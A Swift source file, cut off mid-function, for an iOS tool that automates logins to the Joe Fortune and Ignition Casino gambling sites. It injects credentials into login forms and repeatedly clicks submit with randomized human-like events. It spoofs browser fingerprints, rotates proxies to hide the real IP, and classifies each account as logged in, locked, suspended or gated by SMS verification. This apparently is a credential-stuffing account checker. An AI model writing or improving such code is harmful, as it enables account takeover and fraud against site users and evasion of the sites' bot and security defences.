import Foundation
import WebKit
import UIKit
import Vision

nonisolated enum LoginTargetSite: String, CaseIterable, Sendable {
    case joefortune = "Joe Fortune"
    case ignition = "Ignition Casino"

    var url: URL {
        switch self {
        case .joefortune: URL(string: "https://joefortune24.com/login")!
        case .ignition: URL(string: "https://www.ignitioncasino.eu/login")!
        }
    }

    var host: String {
        switch self {
        case .joefortune: "joefortune24.com"
        case .ignition: "ignitioncasino.eu"
        }
    }

    var icon: String {
        switch self {
        case .joefortune: "suit.spade.fill"
        case .ignition: "flame.fill"
        }
    }

    var accentColorName: String {
        switch self {
        case .joefortune: "green"
        case .ignition: "orange"
        }
    }
}

@MainActor
class LoginSiteWebSession: NSObject {
    private(set) var webView: WKWebView?
    private let sessionId: UUID = UUID()
    private var pageLoadContinuation: CheckedContinuation<Bool, Never>?
    private var isPageLoaded: Bool = false
    private var loadTimeoutTask: Task<Void, Never>?
    var stealthEnabled: Bool = false
    var lastNavigationError: String?
    var lastHTTPStatusCode: Int?
    var targetURL: URL
    var networkConfig: ActiveNetworkConfig = .direct
    private var isProtectedRouteBlocked: Bool = false
    var proxyTarget: ProxyRotationService.ProxyTarget = .joe
    private(set) var stealthProfile: PPSRStealthService.SessionProfile?
    private(set) var lastFingerprintScore: FingerprintValidationService.FingerprintScore?
    private(set) var activeProfileIndex: Int?
    var onFingerprintLog: ((String, PPSRLogEntry.Level) -> Void)?
    private let logger = DebugLogger.shared
    private(set) var navigationCount: Int = 0
    private(set) var processTerminated: Bool = false
    var onProcessTerminated: (() -> Void)?
    var monitoringSessionId: String?

    private func resolvePageLoad(_ result: Bool, errorMessage: String? = nil) {
        guard let cont = pageLoadContinuation else { return }
        pageLoadContinuation = nil
        if let errorMessage {
            lastNavigationError = lastNavigationError ?? errorMessage
        }
        loadTimeoutTask?.cancel()
        loadTimeoutTask = nil
        cont.resume(returning: result)
    }

    init(targetURL: URL, networkConfig: ActiveNetworkConfig = .direct, proxyTarget: ProxyRotationService.ProxyTarget? = nil) {
        self.targetURL = targetURL
        self.networkConfig = networkConfig
        self.proxyTarget = proxyTarget ?? Self.inferProxyTarget(for: targetURL)
        super.init()
    }

    private static func inferProxyTarget(for targetURL: URL) -> ProxyRotationService.ProxyTarget {
        let host = targetURL.host?.lowercased() ?? ""
        if host.contains("ppsr") {
            return .ppsr
        }
        if host.contains("ignition") {
            return .ignition
        }
        return .joe
    }

    func setUp(wipeAll: Bool = true) async {
        if wipeAll {
            let dataStore = WKWebsiteDataStore.default()
            let allTypes = WKWebsiteDataStore.allWebsiteDataTypes()
            dataStore.removeData(ofTypes: allTypes, modifiedSince: .distantPast) { }
            HTTPCookieStorage.shared.removeCookies(since: .distantPast)
            URLCache.shared.removeAllCachedResponses()
        }

        if webView != nil {
            tearDown(wipeAll: false)
        }

        let config = WKWebViewConfiguration()
        config.websiteDataStore = .nonPersistent()
        config.preferences.javaScriptCanOpenWindowsAutomatically = true
        config.defaultWebpagePreferences.allowsContentJavaScript = true

        let proxyApplied = NetworkSessionFactory.shared.configureWKWebView(config: config, networkConfig: networkConfig, target: proxyTarget)
        isProtectedRouteBlocked = networkConfig.requiresProtectedRoute && !proxyApplied
        if isProtectedRouteBlocked {
            lastNavigationError = "Protected route blocked — no proxy path available for \(proxyTarget.rawValue)"
            logger.log("LoginSiteWebSession: BLOCKED — no proxy available for \(proxyTarget.rawValue), refusing to load on real IP", category: .network, level: .error)
        }
        logger.log("LoginSiteWebSession: setUp with network=\(networkConfig.label) target=\(proxyTarget.rawValue)", category: .network, level: .debug)

        if stealthEnabled {
            let stealth = PPSRStealthService.shared
            let host = targetURL.host ?? ""
            let (profile, profileIdx) = await stealth.nextProfileForHost(host)
            self.stealthProfile = profile
            self.activeProfileIndex = profileIdx

            let userScript = stealth.createStealthUserScript(profile: profile)
            config.userContentController.addUserScript(userScript)

            let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: profile.viewport.width, height: profile.viewport.height), configuration: config)
            webView.navigationDelegate = self
            webView.customUserAgent = profile.userAgent
            self.webView = webView
            WebViewTracker.shared.incrementActive()
        } else {
            let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 390, height: 844), configuration: config)
            webView.navigationDelegate = self
            webView.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
            self.webView = webView
            WebViewTracker.shared.incrementActive()
        }
    }

    func tearDown(wipeAll: Bool = true) {
        loadTimeoutTask?.cancel()
        loadTimeoutTask = nil

        if let wv = webView {
            wv.stopLoading()
            if wipeAll {
                wv.configuration.websiteDataStore.removeData(
                    ofTypes: WKWebsiteDataStore.allWebsiteDataTypes(),
                    modifiedSince: .distantPast
                ) { }
                wv.configuration.userContentController.removeAllUserScripts()
            }
            wv.navigationDelegate = nil
        }
        if webView != nil {
            WebViewTracker.shared.decrementActive()
        }
        webView = nil
        isPageLoaded = false
        isProtectedRouteBlocked = false
        lastNavigationError = nil
        lastHTTPStatusCode = nil
        if let cont = pageLoadContinuation {
            pageLoadContinuation = nil
            cont.resume(returning: false)
        }
    }

    func injectFingerprint() async {
        guard stealthEnabled, let profile = stealthProfile else { return }
        let js = PPSRStealthService.shared.fingerprintJS()
        _ = await executeJS(js)
    }

    var fingerprintValidationEnabled: Bool = false

    func validateFingerprint(maxRetries: Int = 2) async -> Bool {
        guard fingerprintValidationEnabled, stealthEnabled, let wv = webView, let profile = stealthProfile else { return true }

        for attempt in 0..<maxRetries {
            let score = await FingerprintValidationService.shared.validate(in: wv, profileSeed: profile.seed)
            lastFingerprintScore = score

            if score.passed {
                onFingerprintLog?("FP score PASS: \(score.totalScore)/\(score.maxSafeScore) (seed: \(profile.seed))", .success)
                return true
            }

            let signalSummary = score.signals.prefix(3).joined(separator: ", ")
            onFingerprintLog?("FP score FAIL attempt \(attempt + 1): \(score.totalScore)/\(score.maxSafeScore) [\(signalSummary)]", .warning)

            if attempt < maxRetries - 1 {
                onFingerprintLog?("Rotating stealth profile to reduce FP score...", .info)
                let stealth = PPSRStealthService.shared
                let newProfile = await stealth.nextProfile()
                self.stealthProfile = newProfile
                webView?.customUserAgent = newProfile.userAgent
                let newJS = stealth.createStealthUserScript(profile: newProfile)
                webView?.configuration.userContentController.removeAllUserScripts()
                webView?.configuration.userContentController.addUserScript(newJS)
                _ = await executeJS(PPSRStealthService.shared.buildComprehensiveStealthJSPublic(profile: newProfile))
                try? await Task.sleep(for: .milliseconds(500))
            }
        }

        onFingerprintLog?("FP validation failed after \(maxRetries) profile rotations — proceeding with caution", .error)
        return false
    }

    func loadPage(timeout: TimeInterval = 90) async -> Bool {
        let timeout = TimeoutResolver.resolvePageLoadTimeout(timeout)
        guard let webView else {
            lastNavigationError = "WebView not initialized"
            return false
        }
        guard !isProtectedRouteBlocked else {
            return false
        }
        isPageLoaded = false
        lastNavigationError = nil
        lastHTTPStatusCode = nil

        if let existingCont = pageLoadContinuation {
            pageLoadContinuation = nil
            existingCont.resume(returning: false)
        }

        let request = URLRequest(url: targetURL, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: timeout)
        webView.load(request)

        let loaded = await withCheckedContinuation { (continuation: CheckedContinuation<Bool, Never>) in
            self.pageLoadContinuation = continuation
            self.loadTimeoutTask = Task {
                try? await Task.sleep(for: .seconds(timeout))
                await MainActor.run {
                    self.resolvePageLoad(false, errorMessage: "Page load timed out after \(Int(timeout))s")
                }
            }
        }

        loadTimeoutTask?.cancel()
        loadTimeoutTask = nil

        if loaded {
            await injectFingerprint()
            try? await Task.sleep(for: .milliseconds(1500))
            await waitForDOMReady(timeout: TimeoutResolver.resolveAutomationTimeout(10))
            let _ = await validateFingerprint()
        }

        return loaded
    }

    private func waitForDOMReady(timeout: TimeInterval) async {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let start = Date()
        while Date().timeIntervalSince(start) < timeout {
            let ready = await executeJS("document.readyState") ?? ""
            if ready == "complete" || ready == "interactive" {
                try? await Task.sleep(for: .milliseconds(500))
                return
            }
            try? await Task.sleep(for: .milliseconds(300))
        }
    }

    private let findFieldJS = """
    function findField(strategies) {
        for (var i = 0; i < strategies.length; i++) {
            var s = strategies[i];
            var el = null;
            try {
                if (s.type === 'id') {
                    el = document.getElementById(s.value);
                } else if (s.type === 'name') {
                    var els = document.getElementsByName(s.value);
                    if (els.length > 0) el = els[0];
                } else if (s.type === 'placeholder') {
                    el = document.querySelector('input[placeholder*="' + s.value + '"]');
                } else if (s.type === 'label') {
                    var labels = document.querySelectorAll('label');
                    for (var j = 0; j < labels.length; j++) {
                        var txt = (labels[j].textContent || '').trim().toLowerCase();
                        if (txt.indexOf(s.value.toLowerCase()) !== -1) {
                            var forId = labels[j].getAttribute('for');
                            if (forId) { el = document.getElementById(forId); }
                            else { el = labels[j].querySelector('input'); }
                            if (el) break;
                        }
                    }
                } else if (s.type === 'css') {
                    el = document.querySelector(s.value);
                } else if (s.type === 'ariaLabel') {
                    el = document.querySelector('[aria-label*="' + s.value + '"]');
                }
            } catch(e) {}
            if (el && !el.disabled && el.offsetParent !== null) return el;
            if (el && !el.disabled) return el;
        }
        return null;
    }
    """

    private func fillFieldJS(strategies: String, value: String) -> String {
        let escaped = value.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
        return """
        (function() {
            \(findFieldJS)
            var el = findField(\(strategies));
            if (!el) return 'NOT_FOUND';
            el.focus();
            var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            if (nativeInputValueSetter && nativeInputValueSetter.set) {
                nativeInputValueSetter.set.call(el, '');
            } else {
                el.value = '';
            }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            if (nativeInputValueSetter && nativeInputValueSetter.set) {
                nativeInputValueSetter.set.call(el, '\(escaped)');
            } else {
                el.value = '\(escaped)';
            }
            el.dispatchEvent(new Event('focus', {bubbles: true}));
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            el.dispatchEvent(new Event('blur', {bubbles: true}));
            return el.value === '\(escaped)' ? 'OK' : 'VALUE_MISMATCH';
        })();
        """
    }

    private func escapeForJS(_ str: String) -> String {
        str.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
    }

    private func calibratedFillJS(selector: String, value: String) -> String {
        let safeSel = escapeForJS(selector)
        let safeVal = escapeForJS(value)
        return "(function(){ try { var el = document.querySelector('" + safeSel + "'); if (!el) return 'CAL_NOT_FOUND'; el.focus(); var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value'); if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; } el.dispatchEvent(new Event('input', {bubbles:true})); if (ns && ns.set) { ns.set.call(el, '" + safeVal + "'); } else { el.value = '" + safeVal + "'; } el.dispatchEvent(new Event('input', {bubbles:true})); el.dispatchEvent(new Event('change', {bubbles:true})); return el.value.length > 0 ? 'CAL_OK' : 'CAL_MISMATCH'; } catch(e) { return 'CAL_ERROR'; } })()"
    }

    private func calibratedClickJS(selector: String) -> String {
        let safeSel = escapeForJS(selector)
        return "(function(){ try { var el = document.querySelector('" + safeSel + "'); if (!el) return 'CAL_NOT_FOUND'; el.scrollIntoView({behavior:'instant',block:'center'}); var r = el.getBoundingClientRect(); var cx = r.left+r.width*0.5; var cy = r.top+r.height*0.5; el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0,buttons:1})); el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0,buttons:1})); el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0})); el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0})); el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0})); el.click(); return 'CAL_CLICKED:' + (el.textContent||'').trim().substring(0,20); } catch(e) { return 'CAL_ERROR'; } })()"
    }

    func fillUsernameCalibrated(_ username: String, calibration: LoginCalibrationService.URLCalibration?) async -> (success: Bool, detail: String) {
        if let cal = calibration, let emailMap = cal.emailField, !emailMap.cssSelector.isEmpty {
            let allSelectors = [emailMap.cssSelector] + emailMap.fallbackSelectors
            for selector in allSelectors {
                let calJS = calibratedFillJS(selector: selector, value: username)
                let result = await executeJS(calJS)
                if result == "CAL_OK" || result == "CAL_MISMATCH" {
                    return (true, "Username filled via calibrated selector: \(selector)")
                }
            }
            if let coords = emailMap.coordinates {
                let coordResult = await fillFieldAtCoordinates(coords, value: username, fieldName: "email")
                if coordResult.success { return coordResult }
            }
        }
        return await fillUsername(username)
    }

    func fillPasswordCalibrated(_ password: String, calibration: LoginCalibrationService.URLCalibration?) async -> (success: Bool, detail: String) {
        if let cal = calibration, let passMap = cal.passwordField, !passMap.cssSelector.isEmpty {
            let allSelectors = [passMap.cssSelector] + passMap.fallbackSelectors
            for selector in allSelectors {
                let calJS = calibratedFillJS(selector: selector, value: password)
                let result = await executeJS(calJS)
                if result == "CAL_OK" || result == "CAL_MISMATCH" {
                    return (true, "Password filled via calibrated selector: \(selector)")
                }
            }
            if let coords = passMap.coordinates {
                let coordResult = await fillFieldAtCoordinates(coords, value: password, fieldName: "password")
                if coordResult.success { return coordResult }
            }
        }
        return await fillPassword(password)
    }

    func clickLoginButtonCalibrated(calibration: LoginCalibrationService.URLCalibration?) async -> (success: Bool, detail: String) {
        if let cal = calibration, let btnMap = cal.loginButton {
            let allSelectors = [btnMap.cssSelector] + btnMap.fallbackSelectors
            for selector in allSelectors where !selector.isEmpty {
                let calClickJS = calibratedClickJS(selector: selector)
                let result = await executeJS(calClickJS)
                if let result, result.hasPrefix("CAL_CLICKED") {
                    return (true, "Login clicked via calibrated selector: \(result)")
                }
            }
            if let coords = btnMap.coordinates {
                let cx = Int(coords.x)
                let cy = Int(coords.y)
                let coordJS = "(function(){var cx=\(cx);var cy=\(cy);var el=document.elementFromPoint(cx,cy);if(!el)return'NO_EL';el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0,buttons:1}));el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0,buttons:1}));el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0}));el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0}));el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,clientX:cx,clientY:cy,button:0}));try{el.click();}catch(e){}return'CAL_COORD:'+el.tagName;})()"
                let result = await executeJS(coordJS)
                if let result, result.hasPrefix("CAL_COORD") {
                    return (true, "Login clicked via coordinates: \(result)")
                }
            }
        }
        return await clickLoginButton()
    }

    func runDeepDOMProbe() async -> DOMProbeResult {
        let coordinator = CalibrationWebViewCoordinator()
        coordinator.webView = webView
        return await coordinator.runDeepDOMProbe()
    }

    func autoCalibrate() async -> LoginCalibrationService.URLCalibration? {
        let probe = await runDeepDOMProbe()
        guard probe.emailSelector != nil || probe.passwordSelector != nil else { return nil }
        var cal = LoginCalibrationService.URLCalibration(urlPattern: targetURL.host ?? targetURL.absoluteString)
        if let emailSel = probe.emailSelector {
            cal.emailField = LoginCalibrationService.ElementMapping(cssSelector: emailSel, fallbackSelectors: probe.emailFallbacks)
        }
        if let passSel = probe.passwordSelector {
            cal.passwordField = LoginCalibrationService.ElementMapping(cssSelector: passSel, fallbackSelectors: probe.passwordFallbacks)
        }
        if let btnSel = probe.buttonSelector {
            cal.loginButton = LoginCalibrationService.ElementMapping(cssSelector: btnSel, fallbackSelectors: probe.buttonFallbacks, nearbyText: probe.buttonText)
        }
        cal.pageStructureHash = probe.pageStructureHash
        return cal
    }

    private func fillFieldAtCoordinates(_ coords: CGPoint, value: String, fieldName: String) async -> (success: Bool, detail: String) {
        let safeVal = escapeForJS(value)
        let cx = Int(coords.x)
        let cy = Int(coords.y)
        let js = "(function(){var el=document.elementFromPoint(\(cx),\(cy));if(!el)return'NO_EL';if(el.tagName!=='INPUT'&&el.tagName!=='TEXTAREA'){var inp=el.querySelector('input');if(inp)el=inp;}el.focus();var ns=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value');if(ns&&ns.set){ns.set.call(el,'');}else{el.value='';}el.dispatchEvent(new Event('input',{bubbles:true}));if(ns&&ns.set){ns.set.call(el,'" + safeVal + "');}else{el.value='" + safeVal + "';}el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));return el.value.length>0?'COORD_OK':'COORD_MISMATCH';})()"
        let result = await executeJS(js)
        if result == "COORD_OK" || result == "COORD_MISMATCH" {
            return (true, "\(fieldName) filled via calibrated coordinates")
        }
        return (false, "\(fieldName) coordinate fill failed: \(result ?? "nil")")
    }

    // MARK: - TRUE DETECTION Hardcoded Methods

    func trueDetectionFillEmail(_ username: String) async -> (success: Bool, detail: String) {
        let escaped = username.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
        let js = """
        (function() {
            var el = document.querySelector('#email');
            if (!el) return 'NOT_FOUND';
            el.focus();
            el.dispatchEvent(new Event('focus', {bubbles: true}));
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            if (ns && ns.set) { ns.set.call(el, '\(escaped)'); } else { el.value = '\(escaped)'; }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            el.dispatchEvent(new Event('blur', {bubbles: true}));
            return el.value === '\(escaped)' ? 'OK' : 'VALUE_MISMATCH';
        })();
        """
        let result = await executeJS(js)
        if result == "OK" || result == "VALUE_MISMATCH" {
            return (true, "TRUE DETECTION: Email filled via #email")
        }
        return (false, "TRUE DETECTION: Email fill failed on #email — \(result ?? "nil")")
    }

    func trueDetectionFillPassword(_ password: String) async -> (success: Bool, detail: String) {
        let escaped = password.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
        let js = """
        (function() {
            var el = document.querySelector('#login-password');
            if (!el) return 'NOT_FOUND';
            el.focus();
            el.dispatchEvent(new Event('focus', {bubbles: true}));
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            if (ns && ns.set) { ns.set.call(el, '\(escaped)'); } else { el.value = '\(escaped)'; }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            el.dispatchEvent(new Event('blur', {bubbles: true}));
            return el.value === '\(escaped)' ? 'OK' : 'VALUE_MISMATCH';
        })();
        """
        let result = await executeJS(js)
        if result == "OK" || result == "VALUE_MISMATCH" {
            return (true, "TRUE DETECTION: Password filled via #login-password")
        }
        return (false, "TRUE DETECTION: Password fill failed on #login-password — \(result ?? "nil")")
    }

    func trueDetectionTripleClickSubmit(clickCount: Int = 4, delayMs: Int = 1100, cycleCount: Int = 4, buttonRecoveryTimeoutMs: Int = 12000) async -> (success: Bool, detail: String) {
        let checkJS = """
        (function() {
            var btn = document.querySelector('#login-submit');
            if (!btn) return 'NOT_FOUND';
            return 'FOUND';
        })();
        """
        let checkResult = await executeJS(checkJS)
        guard checkResult == "FOUND" else {
            return (false, "TRUE DETECTION: Submit button #login-submit NOT_FOUND")
        }

        let effectiveCycles = max(1, cycleCount)
        let buttonRecovery = SmartButtonRecoveryService.shared
        let currentURL = await getCurrentURL()
        let host = URL(string: currentURL)?.host ?? "unknown"
        let sessionId = monitoringSessionId ?? ""

        for cycle in 0..<effectiveCycles {
            let preClickFingerprint = await buttonRecovery.captureFingerprint(
                executeJS: { [weak self] js in await self?.executeJS(js) },
                sessionId: sessionId
            )

            for i in 0..<clickCount {
                let clickJS = """
                (function() {
                    var btn = document.querySelector('#login-submit');
                    if (!btn) return 'NOT_FOUND';
                    btn.scrollIntoView({behavior:'instant',block:'center'});
                    var r = btn.getBoundingClientRect();
                    var cx = r.left + r.width * (0.3 + Math.random() * 0.4);
                    var cy = r.top + r.height * (0.3 + Math.random() * 0.4);
                    btn.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0,buttons:1}));
                    btn.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0,buttons:1}));
                    btn.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0}));
                    btn.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    btn.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    btn.click();
                    return 'CLICKED';
                })();
                """
                _ = await executeJS(clickJS)
                if i < clickCount - 1 {
                    try? await Task.sleep(for: .milliseconds(delayMs))
                }
            }

            if cycle < effectiveCycles - 1 {
                if let fingerprint = preClickFingerprint {
                    _ = await buttonRecovery.waitForRecovery(
                        originalFingerprint: fingerprint,
                        executeJS: { [weak self] js in await self?.executeJS(js) },
                        host: host,
                        sessionId: sessionId,
                        maxTimeoutMs: buttonRecoveryTimeoutMs
                    )
                } else {
                    try? await Task.sleep(for: .milliseconds(2000))
                }
                try? await Task.sleep(for: .milliseconds(Int.random(in: 200...500)))
            }
        }
        return (true, "TRUE DETECTION: Cycled triple-click on #login-submit (\(effectiveCycles) cycles x \(clickCount) clicks, \(delayMs)ms apart)")
    }

    func trueDetectionValidateSuccess() async -> (success: Bool, marker: String?) {
        let pageContent = await getPageContent()
        let contentLower = pageContent.lowercased()
        let markers = ["balance", "wallet", "my account", "logout"]
        for marker in markers {
            if contentLower.contains(marker) {
                return (true, marker)
            }
        }
        return (false, nil)
    }

    func trueDetectionCheckTerminalError() async -> (isTerminal: Bool, keyword: String?) {
        let pageContent = await getPageContent()
        let contentLower = pageContent.lowercased()
        let terminalKeywords = [
            "temporarily disabled", "account is disabled",
            "account has been disabled", "has been disabled",
            "account has been suspended", "has been suspended",
            "account has been blocked", "has been blocked",
            "account has been deactivated", "permanently banned",
            "account is closed", "self-excluded",
            "contact customer service", "contact support",
            "your account is locked", "account is restricted"
        ]
        for keyword in terminalKeywords {
            if contentLower.contains(keyword) {
                return (true, keyword)
            }
        }

        let currentURL = await getCurrentURL()
        if currentURL.lowercased().contains("ignition") {
            let smsKeywords = [
                "sms", "text message", "verification code", "verify your phone",
                "send code", "sent a code", "enter the code", "phone verification",
                "mobile verification", "confirm your number", "we sent", "code sent",
                "enter code", "security code sent", "check your phone"
            ]
            for keyword in smsKeywords {
                if contentLower.contains(keyword) {
                    return (true, "SMS_NOTIFICATION: \(keyword)")
                }
            }
        }

        let bannerSelectors = [".error-banner", ".alert-danger", ".alert-error", ".login-error", ".notification-error", "[role='alert']"]
        for selector in bannerSelectors {
            let escaped = selector.replacingOccurrences(of: "'", with: "\\'")
            let js = """
            (function(){
                var el=document.querySelector('\(escaped)');
                if(!el||el.offsetParent===null)return'NONE';
                var style=window.getComputedStyle(el);
                var bg=style.backgroundColor||'';
                var isRed=false;
                var m=bg.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);
                if(m){var r=parseInt(m[1]),g=parseInt(m[2]),b=parseInt(m[3]);isRed=r>140&&g<80&&b<80;}
                if(!isRed){var p=el.parentElement;for(var i=0;i<3&&p;i++){var ps=window.getComputedStyle(p).backgroundColor||'';var pm=ps.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);if(pm){var pr=parseInt(pm[1]),pg=parseInt(pm[2]),pb=parseInt(pm[3]);if(pr>140&&pg<80&&pb<80){isRed=true;break;}}p=p.parentElement;}}
                if(!isRed)return'NONE';
                var text=el.textContent.trim();
                if(!/error/i.test(text)&&text.length>100)return'NONE';
                return'BANNER:'+text.substring(0,200);
            })();
            """
            let result = await executeJS(js)
            if let result, result.hasPrefix("BANNER:") {
                return (true, String(result.dropFirst(7)))
            }
        }
        return (false, nil)
    }

    // MARK: - Legacy Fill Methods

    func fillUsername(_ username: String) async -> (success: Bool, detail: String) {
        let strategies = """
        [
            {"type":"id","value":"email"},{"type":"id","value":"username"},{"type":"id","value":"login-email"},
            {"type":"id","value":"login_email"},{"type":"id","value":"user_login"},{"type":"id","value":"loginEmail"},
            {"type":"name","value":"email"},{"type":"name","value":"username"},{"type":"name","value":"login"},
            {"type":"name","value":"user_login"},{"type":"name","value":"loginEmail"},
            {"type":"placeholder","value":"Email"},{"type":"placeholder","value":"email"},
            {"type":"placeholder","value":"Username"},{"type":"placeholder","value":"username"},
            {"type":"placeholder","value":"Enter your email"},{"type":"placeholder","value":"Login"},
            {"type":"label","value":"email"},{"type":"label","value":"username"},{"type":"label","value":"login"},
            {"type":"ariaLabel","value":"email"},{"type":"ariaLabel","value":"username"},
            {"type":"css","value":"input[type='email']"},{"type":"css","value":"input[autocomplete='email']"},
            {"type":"css","value":"input[autocomplete='username']"},
            {"type":"css","value":"form input[type='text']:first-of-type"},
            {"type":"css","value":"input[type='text']"}
        ]
        """
        let result = await executeJS(fillFieldJS(strategies: strategies, value: username))
        return classifyFillResult(result, fieldName: "Username/Email")
    }

    func fillPassword(_ password: String) async -> (success: Bool, detail: String) {
        let strategies = """
        [
            {"type":"id","value":"password"},{"type":"id","value":"login-password"},
            {"type":"id","value":"login_password"},{"type":"id","value":"user_password"},
            {"type":"id","value":"loginPassword"},{"type":"id","value":"pass"},
            {"type":"name","value":"password"},{"type":"name","value":"user_password"},
            {"type":"name","value":"loginPassword"},{"type":"name","value":"pass"},
            {"type":"placeholder","value":"Password"},{"type":"placeholder","value":"password"},
            {"type":"placeholder","value":"Enter your password"},{"type":"placeholder","value":"Enter password"},
            {"type":"label","value":"password"},{"type":"ariaLabel","value":"password"},
            {"type":"css","value":"input[type='password']"},{"type":"css","value":"input[autocomplete='current-password']"}
        ]
        """
        let result = await executeJS(fillFieldJS(strategies: strategies, value: password))
        return classifyFillResult(result, fieldName: "Password")
    }

    func clickLoginButton() async -> (success: Bool, detail: String) {
        let megaClickJS = """
        (function() {
            function getOpacity(el) {
                try { return parseFloat(window.getComputedStyle(el).opacity); } catch(e) { return 1; }
            }

            function humanClick(el) {
                if (!el) return false;
                try {
                    el.scrollIntoView({behavior:'instant',block:'center'});
                    var rect = el.getBoundingClientRect();
                    if (rect.width === 0 && rect.height === 0) return false;
                    var cx = rect.left + rect.width * (0.3 + Math.random() * 0.4);
                    var cy = rect.top + rect.height * (0.3 + Math.random() * 0.4);
                    el.focus();
                    try { el.dispatchEvent(new PointerEvent('pointerover',{bubbles:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse'})); } catch(e){}
                    try { el.dispatchEvent(new MouseEvent('mouseover',{bubbles:true,clientX:cx,clientY:cy})); } catch(e){}
                    try { el.dispatchEvent(new PointerEvent('pointerenter',{bubbles:false,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse'})); } catch(e){}
                    try { el.dispatchEvent(new MouseEvent('mouseenter',{bubbles:false,clientX:cx,clientY:cy})); } catch(e){}
                    try { el.dispatchEvent(new PointerEvent('pointermove',{bubbles:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse'})); } catch(e){}
                    try { el.dispatchEvent(new MouseEvent('mousemove',{bubbles:true,clientX:cx,clientY:cy})); } catch(e){}
                    el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0,buttons:1}));
                    el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0,buttons:1}));
                    el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse',button:0}));
                    el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    return true;
                } catch(e) { return false; }
            }

            function touchClick(el) {
                if (!el) return false;
                try {
                    var rect = el.getBoundingClientRect();
                    var cx = rect.left + rect.width * (0.3 + Math.random() * 0.4);
                    var cy = rect.top + rect.height * (0.3 + Math.random() * 0.4);
                    el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'touch'}));
                    try {
                        var t = new Touch({identifier:Date.now(),target:el,clientX:cx,clientY:cy,pageX:cx+window.scrollX,pageY:cy+window.scrollY});
                        el.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,cancelable:true,touches:[t],targetTouches:[t],changedTouches:[t]}));
                        el.dispatchEvent(new TouchEvent('touchend',{bubbles:true,cancelable:true,touches:[],targetTouches:[],changedTouches:[t]}));
                    } catch(e) {}
